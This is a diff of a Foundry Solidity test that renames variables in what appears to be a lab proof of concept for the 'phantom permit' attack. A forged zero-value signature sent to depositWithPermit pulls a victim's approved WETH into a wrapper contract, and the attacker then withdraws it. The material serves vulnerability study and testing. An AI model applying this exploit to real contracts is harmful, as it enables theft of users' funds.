@@ -5,38 +5,38 @@ import "forge-std/Test.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract ContractTest is Test {
-    PermitToken VulnPermitContract;
+    PermitToken PermitContract;
     WETH9 WETH9Contract;
 
     function setUp() public {
         WETH9Contract = new WETH9();
-        VulnPermitContract = new PermitToken(IERC20(address(WETH9Contract)));
+        PermitContract = new PermitToken(IERC20(address(WETH9Contract)));
     }
 
-    function testVulnPhantomPermit() public {
+    function testPhantomPermit() public {
         address alice = vm.addr(1);
         vm.deal(address(alice), 10 ether);
 
         vm.startPrank(alice);
         WETH9Contract.deposit{value: 10 ether}();
-        WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);
+        WETH9Contract.approve(address(PermitContract), type(uint256).max);
         vm.stopPrank();
         console.log(
             "start WETH balanceOf this",
             WETH9Contract.balanceOf(address(this))
         );
 
-        VulnPermitContract.depositWithPermit(
+        PermitContract.depositWithPermit(
             address(alice),
             1000,
             27,
             0x0,
             0x0
         );
-        uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));
-        console.log("WETH balanceOf VulnPermitContract", wbal);
+        uint wbal = WETH9Contract.balanceOf(address(PermitContract));
+        console.log("WETH balanceOf PermitContract", wbal);
 
-        VulnPermitContract.withdraw(1000);
+        PermitContract.withdraw(1000);
 
         wbal = WETH9Contract.balanceOf(address(this));
         console.log("WETH9Contract balanceOf this", wbal);
